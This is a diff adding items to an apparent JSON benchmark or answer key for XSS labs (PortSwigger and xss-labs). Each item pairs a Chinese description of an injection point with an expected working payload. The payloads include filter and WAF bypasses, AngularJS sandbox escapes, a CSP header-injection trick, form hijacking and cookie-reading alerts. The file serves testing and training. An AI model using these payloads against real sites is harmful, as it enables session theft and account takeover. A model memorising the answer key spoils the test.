@@ -75,5 +75,208 @@
     "expected": "javascript:alert(1)",
     "grader": "contains",
     "keyword": "URL 属性上下文用 javascript: 伪协议（无法 breakout 引号时）"
+  },
+  {
+    "id": "auto-20261011121924",
+    "input": "反射点在首页 search 参数的搜索结果页，搜索词被拼进 <script> 块里的 JS 字符串（var searchTerms = '...';），单引号未编码，但尖括号 < > 被 HTML 编码，无法插入 <script> 标签。",
+    "expected": "'-alert(1)-'",
+    "grader": "contains",
+    "keyword": "JS 字符串 breakout / 单引号闭合"
+  },
+  {
+    "id": "auto-20261011131240",
+    "input": "商品详情页 /product，location.search 的 storeId 参数被客户端 JS 通过 document.write 拼进 <select> 元素内部（DOM XSS，不经服务端）。",
+    "expected": "</select><img src=1 onerror=alert(1)>",
+    "grader": "contains",
+    "keyword": "document.write sink + select 元素内 breakout"
+  },
+  {
+    "id": "auto-20261011133034",
+    "input": "博客首页 search 参数反射进 ng-app 作用域（文本节点），尖括号和双引号被 HTML 编码，无法用标签/属性 breakout。",
+    "expected": "{{$on.constructor('alert(1)')()}}",
+    "grader": "contains",
+    "keyword": "AngularJS 表达式注入 + 绕过尖括号/双引号编码"
+  },
+  {
+    "id": "auto-20261011133308",
+    "input": "搜索页 search 参数经 XHR 到 /search-results 返回 JSON（{\"results\":[],\"searchTerm\":\"...\"}），客户端将该 JSON 响应文本直接 eval；服务端只把 \" 转义为 \\\"，不转义输入中的反斜杠。",
+    "expected": "\\\"-alert(1)}//",
+    "grader": "contains",
+    "keyword": "eval sink + 反斜杠转义引号绕过（\\\" breakout）"
+  },
+  {
+    "id": "auto-20261011133755",
+    "input": "博客评论表单 comment 字段内容存入服务端后由客户端 JS 用 innerHTML 渲染；渲染前只对输入中第一个 < 和第一个 > 做 HTML 转义（replace 非全局），属存储型 DOM XSS。",
+    "expected": "<><img src=1 onerror=alert(1)>",
+    "grader": "contains",
+    "keyword": "stored DOM XSS + 非全局 replace 绕过（首字符消耗）"
+  },
+  {
+    "id": "auto-20261011134412",
+    "input": "搜索参数反射进 HTML 文本节点，WAF 黑名单拦截大多数标签与属性（<script> 报 \"Tag is not allowed\"，onload 报 \"Attribute is not allowed\"），但 <body> 与 onresize 被放行；无自触发事件可用，需通过 iframe 改变宽度来触发 body 的 resize。lab 判定要求调用 print() 且无需用户交互。",
+    "expected": "<iframe src=\"https://LAB/?search=<body onresize=print()>\" onload=this.style.width='100px'></iframe>",
+    "grader": "contains",
+    "keyword": "WAF 标签/属性白名单绕过 + body onresize + iframe 强制 resize 触发"
+  },
+  {
+    "id": "auto-20261011151009",
+    "input": "反射点：博客首页 GET /?search= 的值直接落入 HTML 文本节点。WAF 屏蔽所有标准标签（返回 \"Tag is not allowed\"）及部分属性（如 onload → \"Attribute is not allowed\"），但放行自定义标签 <xss> 与 style/onfocus/tabindex 等属性。要求自动调用 alert(document.cookie)。",
+    "expected": "<xss id=x onfocus=alert(document.cookie) tabindex=1>  并以 URL fragment  #x 自动聚焦该元素触发 onfocus（经 exploit server 以 location='...?search=...%3E#x' 投递）",
+    "grader": "contains",
+    "keyword": "自定义标签 + URL fragment 自动聚焦 onfocus 触发（非 content-visibility）"
+  },
+  {
+    "id": "auto-20261011154859",
+    "input": "反射点：博客首页 GET /?search= 直接反射进 HTML 文本节点。WAF 黑名单拦截常见标签，但 SVG 白名单不全：漏放 <svg>、<animatetransform> 等标签及 onbegin 事件。",
+    "expected": "<svg><animatetransform onbegin=alert(1)>",
+    "grader": "contains",
+    "keyword": "SVG 标签/事件白名单绕过（animatetransform + onbegin 自动触发）"
+  },
+  {
+    "id": "auto-20261011160652",
+    "input": "反射点：首页 <link rel=\"canonical\" href='https://lab/?search=INPUT'/> 的属性值内。尖括号被转义，但单引号未转义，可直接逃逸 href 属性并注入新属性。",
+    "expected": "?search='accesskey='x'onclick='alert(1)   → 注入 accesskey/onclick 到 link 元素，受害者按 ALT+SHIFT+X 触发 onclick（Chrome 专用，需按键交互）",
+    "grader": "contains",
+    "keyword": "属性逃逸 + accesskey 键盘快捷键触发 onclick（无需事件自动触发）"
+  },
+  {
+    "id": "auto-20261011161629",
+    "input": "反射点：搜索页响应中 <script> 块内的 JS 字符串：var searchTerms = 'INPUT'; document.write('<img src=\"/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'\">');。单引号与反斜杠被转义，无法用 ' 跳出字符串。",
+    "expected": "</script><script>alert(1)</script>",
+    "grader": "contains",
+    "keyword": "JS 字符串内被转义引号 → 改用 </script> 闭合脚本块 breakout（标签级逃逸）"
+  },
+  {
+    "id": "auto-20261011182159",
+    "input": "反射点落在内联 <script> 的 JS 字符串字面量里（如 var searchTerms = 'INPUT';）。服务端对 < > 和双引号做 HTML 实体编码，对单引号做「加反斜杠」转义。",
+    "expected": "\\';alert(1)//",
+    "grader": "contains",
+    "keyword": "JS 字符串 breakout（反斜杠吃掉转义反斜杠）"
+  },
+  {
+    "id": "auto-20261011184354",
+    "input": "Stored XSS：博客评论的 website 字段被存下并反射进作者链接的 onclick 属性（内联 JS 字符串内，形如 onclick=\"var tracker={track(){}};tracker.track('WEBSITE');\"）。尖括号和双引号被 HTML 编码，单引号和反斜杠被转义。",
+    "expected": "http://example.com?&apos;-alert(1)-&apos;",
+    "grader": "contains",
+    "keyword": "HTML 实体 &apos; 绕过 JS 字符串转义（实体解码发生在服务端转义之后）"
+  },
+  {
+    "id": "auto-20261011185422",
+    "input": "反射点落在内联 <script> 的 JS 模板字面量里（反引号包围，形如 var searchTerms = `INPUT`;）。尖括号、单引号、双引号、反斜杠、反引号全部被 Unicode 转义（如 \\u003c）。",
+    "expected": "${alert(1)}",
+    "grader": "contains",
+    "keyword": "模板字面量 ${} 表达式插值（无需闭合反引号）"
+  },
+  {
+    "id": "auto-20261011190602",
+    "input": "反射点在 search 参数，落在 JS template literal 内（如 var message = `0 search results for 'SEARCH'`）。尖括号、单双引号、反斜杠、反引号全部被 Unicode 转义（\\u003c 等），无法 breakout 字符串。",
+    "expected": "${alert(1)}",
+    "grader": "contains",
+    "keyword": "template literal 插值 ${} 未转义"
+  },
+  {
+    "id": "auto-20261011203408",
+    "input": "PortSwigger \"Reflected XSS with AngularJS sandbox escape without strings\"。反射点 /?search= 的值被拼进 HTML 并被 AngularJS 当作表达式求值（ng-app）。限制：无法使用字符串字面量（引号被过滤/不可用），且需突破 AngularJS 沙箱。",
+    "expected": "?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1",
+    "grader": "contains",
+    "keyword": "AngularJS 沙箱逃逸 + 无字符串构造（constructor.prototype.charAt=[].join 绕过 sandbox 的 hasOwnProperty 检查，fromCharCode 拼出 x=alert(1)，经 orderBy filter 作为表达式求值执行）"
+  },
+  {
+    "id": "auto-20261011211240",
+    "input": "PortSwigger \"Reflected XSS with AngularJS sandbox escape and CSP\"（EXPERT）。反射点 /?search= 的值被服务端原样插入页面并被 AngularJS(ng-app) 编译求值；页面有严格 CSP（禁内联脚本/事件处理器，禁 unsafe-eval），因此 Angular 指令/表达式是唯一执行路径；search 长度上限 80 字符。目标：alert(document.cookie)。",
+    "expected": "exploit server body: <script>location='https://LAB/?search=<input id=x ng-focus=$event.composedPath()|orderBy:\\'(y=alert)(document.cookie)\\'>#x';</script>（注入 payload：<input id=x ng-focus=$event.composedPath()|orderBy:'(y=alert)(document.cookie)'> 配合 URL 片段 #x 自动聚焦）",
+    "grader": "contains",
+    "keyword": "CSP 绕过 + AngularJS 沙箱逃逸：用 $event.composedPath() 取到事件路径（含 window）作为 orderBy 的输入数组，orderBy 字符串 key 表达式 '(y=alert)(document.cookie)' 在沙箱外被求值执行；URL 片段 #x 让 id=x 元素自动获得焦点触发 ng-focus"
+  },
+  {
+    "id": "auto-20261011214408",
+    "input": "PortSwigger \"Reflected XSS with event handlers and href attributes blocked\"（EXPERT）。反射点 /?search= 的值原样插入 HTML（无编码），但服务端白名单过滤标签、并拦截所有 on* 事件处理器属性和 a 标签的 href 属性。要求：构造一个被点击时执行 alert 的向量，且向量文本须含 \"Click\" 以诱导模拟用户点击。",
+    "expected": "?search=<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>",
+    "grader": "contains",
+    "keyword": "属性过滤绕过：href 属性被拦，但用 SVG <animate attributeName=href values=javascript:alert(1)> 在运行时动态把 href 设为 javascript: URI，绕过对静态 href 属性的检查；配合 <text>Click me</text> 诱导点击"
+  },
+  {
+    "id": "auto-20261011222657",
+    "input": "反射点：post 页 \"Back to Blog\" 链接 href 的 javascript: URL。输入被拼进 fetch 的 body 值（JS 单引号字符串）：`body:'/post?postId=1&x=<input>'`。服务端过滤掉 ( ) \\ [ ] %（禁止直接调 alert()），但允许 ' { } = > , / * : + 等。需点击链接才执行（javascript: href sink）。",
+    "expected": "'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'  （URL 编码：%27%7d%2cx%3dx%3d%3e%7bthrow%2f**%2fonerror%3dalert%2c1337%7d%2ctoString%3dx%2cwindow%2b%27%27%2c%7bx%3a%27）",
+    "grader": "contains",
+    "keyword": "javascript: URL 字符串 breakout；括号过滤绕过 → throw + window.onerror=alert 间接调用 alert(1337)"
+  },
+  {
+    "id": "auto-20261011225332",
+    "input": "反射点：`/my-account?email=<value>`，email 参数被原样（未 HTML 转义）反射进 change-email 表单的 `<input required type=\"email\" name=\"email\" value=\"...\">` 属性（双引号内）。该 input 之后紧跟同一表单的 `<input type=\"hidden\" name=\"csrf\" value=TOKEN>`。站点有严格 CSP（default-src 'self'，禁止加载外部子资源）。因此可注入标签并复用原表单自带的 CSRF token 直接提交 change-email。",
+    "expected": "hacker@evil-user.net\"><button type=\"submit\">Click</button>  （URL 编码：hacker%40evil-user.net%22%3E%3Cbutton%20type%3D%22submit%22%3EClick%3C%2Fbutton%3E）",
+    "grader": "contains",
+    "keyword": "属性内未转义反射 + 表单劫持：breakout 后把注入的 submit 按钮留在原 <form> 内，点击即用该表单自带的 CSRF token 提交 POST /my-account/change-email"
+  },
+  {
+    "id": "auto-20261012001924",
+    "input": "GET /my-account?email= 未转义反射进 change-email 表单 <input type=\"email\" name=\"email\" value=\"...\"> 的双引号 value 属性内，其后紧跟 hidden csrf；CSP 极严格（default-src 'self'），禁内联脚本与外部子资源，无法直接执行 JS，但 HTML/属性注入可用。反射点位于表单内部，可注入 submit 按钮做 form hijacking。",
+    "expected": "hacker@evil-user.net\"><button type=\"submit\">Click</button>",
+    "grader": "contains",
+    "keyword": "严格 CSP 下无 JS 的 form hijacking：注入 <button type=submit>Click</button> 复用页面自带 CSRF token 提交原表单（配合 exploit server 重定向投递）"
+  },
+  {
+    "id": "auto-20261012010019",
+    "input": "反射点在 /my-account?email= 的 <input type=email value=\"...\">，双引号与尖括号未转义（可属性 breakout 并注入 HTML 标签）；同表单内含 hidden csrf，form action=/my-account/change-email。页面 CSP 严格：default-src 'self' 等，禁 inline script 与外部子资源，但同源 form 提交/导航不受限。",
+    "expected": "email=hacker%40evil-user.net%22%3E%3Cbutton%20type%3D%22submit%22%3EClick%3C%2Fbutton%3E （配合 exploit-server Body 内联 <script>location=... 重定向受害者到该注入页，受害者点击注入的 submit 按钮，借用页面自带 csrf 提交表单改邮箱）",
+    "grader": "contains",
+    "keyword": "strict CSP 下的属性 breakout + form hijacking（dangling markup），借用页面自带 CSRF token 提交，非脚本执行"
+  },
+  {
+    "id": "auto-20261012010612",
+    "input": "反射点：GET /?search= 反射进 HTML 文本节点（<script> 可注入但被 CSP 拦截）。目标 CSP 的 report-uri 把 URL 参数 token 原样拼进响应头（report-uri /csp-report?token=<token>），token 未做分隔符过滤。script-src 无 'unsafe-inline'，内联脚本/事件处理器全被拦。",
+    "expected": "/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'",
+    "grader": "contains",
+    "keyword": "CSP header injection / 参数反射进响应头，注入 script-src-elem 'unsafe-inline' 覆盖 script-src 恢复内联"
+  },
+  {
+    "id": "auto-20261012014703",
+    "input": "level7.php?keyword= 反射进 <input value=\"...\">；服务端 str_replace 删除关键词 script/on/src/href/data 等（非递归）",
+    "expected": "\"><scrscriptipt>alert(1)</scrscriptipt>",
+    "grader": "contains",
+    "keyword": "关键词过滤嵌套绕过（scrscriptipt→script）"
+  },
+  {
+    "id": "auto-20261012030906",
+    "input": "level8.php：GET 参数 keyword 反射进两处——① `<input name=keyword value=\"...\">`：htmlspecialchars(ENT_COMPAT)，& < > \" 被转义，属性用双引号 → 无法 breakout；② `<a href=\"...\">友情链接</a>`：服务端先 strtolower，再对 script/src/on/href/data 插下划线（script→scr_ipt 等），并把 `\"` 替换为无分号 `&quot` → 引号内无法逃逸。两个 sink 都在双引号属性内，唯一通路是 href 的 javascript: 伪协议，必须交互（点击）才能执行。",
+    "expected": "keyword=java&#115;cript:alert(1)（URL 编码：java%26%23115%3Bcript%3Aalert(1)），点击页面里的「友情链接」链接后弹窗",
+    "grader": "contains",
+    "keyword": "HTML 实体绕过关键词过滤（script→scr&#105;pt）+ href javascript: 伪协议点击型；自动导航 verify 覆盖不到交互型，需人工触发确认"
+  },
+  {
+    "id": "auto-20261012032305",
+    "input": "level9.php：GET 参数 keyword 反射进 `<input value=\"...\">`（htmlspecialchars ENT_COMPAT，双引号属性无法 breakout）与 `<a href=\"...\">`（strtolower + script/src/on/href/data 插下划线 + `\"`→无分号 &quot）。新增合法性校验：keyword 不含 http:// 时 href 显示「您的链接不合法？有没有！」。两 sink 均在双引号属性内，无免交互 breakout 路径，唯一通路为 href 的 javascript: 伪协议、需点击。",
+    "expected": "keyword=java&#115;cript:alert(1)//http://z（URL 编码 java%26%23115%3Bcript%3Aalert(1)//http%3A%2F%2Fz），点击「友情链接」后弹窗",
+    "grader": "contains",
+    "keyword": "HTML 实体绕关键词过滤 + 满足 http:// 白名单校验（//http://z 被 JS 注释）；href javascript: 点击型；自动导航覆盖不到，需人工触发"
+  },
+  {
+    "id": "auto-20261012032401",
+    "input": "level10.php：只有 t_sort 参数回填进 `<input name=\"t_sort\" value=\"...\" type=\"hidden\">`（keyword 只进文本节点）。t_sort 过滤：`<` 和 `>` 被删除，但 `\"` `'` `&` `(` `)` 原样未转义 → 可用 `\"` 跳出 value 属性，但无法新建标签（无 `<>`），只能给该 input 挂属性/事件。",
+    "expected": "t_sort = `\" type=\"image\" src=x onerror=\"alert(1)` → 渲染为 `<input value=\"\" type=\"image\" src=x onerror=\"alert(1)\" type=\"hidden\">`（首个 type=image 生效，坏 src 自动触发 onerror）",
+    "grader": "contains",
+    "keyword": "属性注入（值内 `\"` 未转义）+ 无交互自动触发（input type=image src=x onerror；headless 下 autofocus+onfocus 不触发）"
+  },
+  {
+    "id": "auto-20261012040053",
+    "input": "level13.php：t_cook 回显 $_COOKIE['user']，未转义地落进 `<input name=\"t_cook\" value=\"...\" type=\"hidden\">`，且服务端对 cookie 值做 strtolower。服务端每次响应都 Set-Cookie 重置 user=call me maybe?（$_COOKIE 读请求、setcookie 写响应），因此必须在写入 cookie 后立即发请求，中间不能再发一次请求。",
+    "expected": "cookie: user=`\"/type=\"image\"/src=\"x\"/onerror=\"alert(1)` → 渲染为 `<input value=\"\"/type=\"image\"/src=\"x\"/onerror=\"alert(1)\" type=\"hidden\">`，type=image + 坏 src 自动触发 onerror",
+    "grader": "contains",
+    "keyword": "Cookie 头注入（同源 JS document.cookie 写，经 javascript: 链接自动执行）；cookie 值不能含空格 → 用带引号的属性值 + `/` 作分隔（注意 `/` 只在「属性名之前」状态分隔，不能分隔未加引号的值）；Set-Cookie 重置需写后立即验证"
+  },
+  {
+    "id": "auto-20261012040941",
+    "input": "level15.php：AngularJS（ng-app）页面，src 参数被拼进 class：`<span class=\"ng-include:test\"></span>`。ng-include 指令通过 class 触发，会把表达式求值结果当作模板 URL 加载并插入 DOM。",
+    "expected": "src = `'level1.php?name=<img src=x onerror=alert(1)>'` → ng-include 加载 level1.php（其 name 参数未转义反射）→ 插入 `<img src=x onerror=alert(1)>` 执行",
+    "grader": "contains",
+    "keyword": "AngularJS ng-include 指令经 class 属性注入 + 同源反射页作为模板载体（把 XSS 反射点当 ng-include 的 URL，借 Angular 把 HTML 插入 DOM 触发事件）"
+  },
+  {
+    "id": "auto-20261012042125",
+    "input": "level16.php：keyword 反射进文本节点 `<center>...` 内；`<`/`>` 和字母放行、无关键字过滤，但服务端把空格替换为 `&nbsp;`（非 HTML 空白，导致标签名/属性粘连，常规 `空格` 分隔失效）。",
+    "expected": "keyword = `<img%0Asrc=x%0Aonerror=alert(1)>`（用换行 %0a 代替空格分隔属性）",
+    "grader": "contains",
+    "keyword": "空格被替换导致标签粘连 → 用换行(\\n)/制表符等其它 HTML 空白字符替代空格分隔属性"
   }
 ]
